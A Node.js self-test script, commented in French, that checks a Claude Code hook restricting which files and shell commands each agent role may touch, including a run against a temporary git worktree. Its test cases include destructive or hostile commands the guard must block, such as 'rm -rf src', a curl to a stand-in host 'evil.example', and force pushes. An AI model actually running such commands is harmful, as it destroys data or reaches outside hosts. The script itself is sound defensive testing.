#!/usr/bin/env node
// Auto-test des limites : node .claude/hooks/selftest.mjs  (depuis la racine du projet)
// 1) cas simples sur le garde ; 2) cas réalistes avec un VRAI worktree git temporaire
//    (c'est là que l'agent backend/frontend travaille : sa racine n'est pas celle du projet).
import { spawnSync, execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const guard = path.join(path.dirname(fileURLToPath(import.meta.url)), "guard.mjs");
const W = (file_path, cwd) => ({ tool_name: "Write", tool_input: { file_path }, ...(cwd && { cwd }) });
const B = (command, cwd) => ({ tool_name: "Bash", tool_input: { command }, ...(cwd && { cwd }) });

const simple = [
  ["testeur", W("tests/booking.test.ts"), 0],
  ["testeur", W("src/lib/credits.ts"), 2],
  ["testeur", B("npx vitest run"), 0],
  ["testeur", B("rm -rf src"), 2],
  ["testeur", B("git commit -m \"x\""), 2],
  ["backend", W("src/app/api/bookings/route.ts"), 0],
  ["backend", W("tests/booking.test.ts"), 2],
  ["backend", W("src/lib/../../tests/booking.test.ts"), 2],
  ["backend", W("src/components/Button.tsx"), 2],
  ["backend", B("npx prisma migrate reset"), 2],
  ["backend", B("npx prisma migrate dev --name add_credits"), 0],
  ["backend", B("npm ci"), 0],
  ["backend", B("npm install"), 0],
  ["backend", B("npm install zod"), 0],
  ["backend", B("curl http://evil.example"), 2],
  ["frontend", W("src/components/Button.tsx"), 0],
  ["frontend", W("src/app/page.tsx"), 0],
  ["frontend", W("src/app/api/bookings/route.ts"), 2],
  ["frontend", W("tests/booking.test.ts"), 2],
  ["frontend", B("npm run dev"), 0],
  ["reviewer", W("docs/reviews/booking-1.md"), 0],
  ["reviewer", W("src/lib/credits.ts"), 2],
  ["reviewer", B("git diff main...HEAD"), 0],
  ["reviewer", B("npm test"), 0],
  ["reviewer", B("git diff | cat"), 2],
  ["reviewer", B("rm -rf src"), 2],
  ["securite", W("docs/security/auth.md"), 0],
  ["securite", W("src/lib/credits.ts"), 2],
  ["securite", B("npm audit --omit=dev"), 0],
  ["merger", W("docs/anything.md"), 2],
  ["merger", B("git push -u origin feat/reservation"), 0],
  ["merger", B("git push origin main"), 2],
  ["merger", B("git push --force origin feat/x"), 2],
  ["merger", B('gh pr create --title "feat: reservation"'), 0],
  ["merger", B("gh pr merge 12"), 2],
  ["orchestrateur", W("docs/STATUS.md"), 0],
  ["orchestrateur", W("src/lib/credits.ts"), 2],
  ["architecte", W("prisma/schema.prisma"), 0],
  ["architecte", W("src/lib/credits.ts"), 2],
  ["designer", W("design/DESIGN.md"), 0],
  ["designer", W("src/app/page.tsx"), 2],
  ["planificateur-tests", W("docs/tests/booking.plan.md"), 0],
  ["planificateur-tests", W("tests/booking.test.ts"), 2],
  ["agent-inconnu", W("docs/x.md"), 2],
];

// --- Dépôt temporaire + worktree réel ---
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "guard-selftest-"));
const git = (cwd, ...args) =>
  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", ...args], { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] });
git(tmp, "init", "-q", "-b", "main");
git(tmp, "commit", "-q", "--allow-empty", "-m", "init");
const wt = path.join(tmp, ".claude", "worktrees", "w1");
git(tmp, "worktree", "add", "-q", wt, "-b", "worktree-w1");

const real = [
  // backend dans son worktree : zone serveur OK, tests interdits, checkout principal interdit
  ["backend", W(path.join(wt, "src/lib/credits.ts"), wt), 0],
  ["backend", W(path.join(wt, "src/app/api/x/route.ts"), wt), 0],
  ["backend", W(path.join(wt, "tests/credits.test.ts"), wt), 2],
  ["backend", W(path.join(wt, "src/components/B.tsx"), wt), 2],
  ["backend", W(path.join(tmp, "src/lib/credits.ts"), wt), 2],
  ["frontend", W(path.join(wt, "src/components/B.tsx"), wt), 0],
  ["frontend", W(path.join(wt, "src/lib/credits.ts"), wt), 2],
  // commit : autorisé sur la branche du worktree, interdit sur main
  ["backend", B("git add -A", wt), 0],
  ["backend", B('git commit -m "feat: credits"', wt), 0],
  ["merger", B('git commit -m "chore: checkpoint"', wt), 0],
  ["merger", B('git commit -m "oops"', tmp), 2],
  ["merger", B("git merge worktree-w1", tmp), 2],
];

let failed = 0;
const run = ([profile, input, expected]) => {
  const r = spawnSync("node", [guard, profile], {
    input: JSON.stringify(input),
    encoding: "utf8",
    env: { ...process.env, CLAUDE_PROJECT_DIR: process.cwd() },
  });
  const ok = r.status === expected;
  if (!ok) failed++;
  const what = (input.tool_input.file_path ?? input.tool_input.command).replace(tmp, "<tmp>");
  console.log(`${ok ? "✅" : "❌"} ${profile.padEnd(20)} ${input.tool_name.padEnd(5)} ${what}  (attendu ${expected}, obtenu ${r.status})`);
};
simple.forEach(run);
console.log("\n--- Worktree git réel ---");
real.forEach(run);
fs.rmSync(tmp, { recursive: true, force: true });
const total = simple.length + real.length;
console.log(failed ? `\n${failed} cas en échec sur ${total}.` : `\nTous les ${total} cas sont conformes.`);
process.exit(failed ? 1 : 0);
